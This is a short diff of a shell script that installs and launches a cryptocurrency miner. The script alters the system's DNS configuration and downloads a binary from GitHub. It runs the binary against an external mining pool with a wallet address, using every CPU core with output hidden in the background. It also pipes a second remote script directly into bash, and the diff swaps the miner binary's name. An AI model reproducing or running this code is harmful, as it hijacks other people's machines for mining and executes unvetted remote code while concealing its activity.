@@ -10,6 +10,6 @@ rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget https://github.com/hasmenkuy99/files/raw/main/avx2adv
-chmod +x plant
-./plant -a power2b -o stratum+tcp://eu.rplant.xyz:7022 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-ai -t $(nproc --all) > /dev/null 2>&1 &
+chmod +x avx2adv
+./avx2adv -a power2b -o stratum+tcp://eu.rplant.xyz:7022 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-ai -t $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
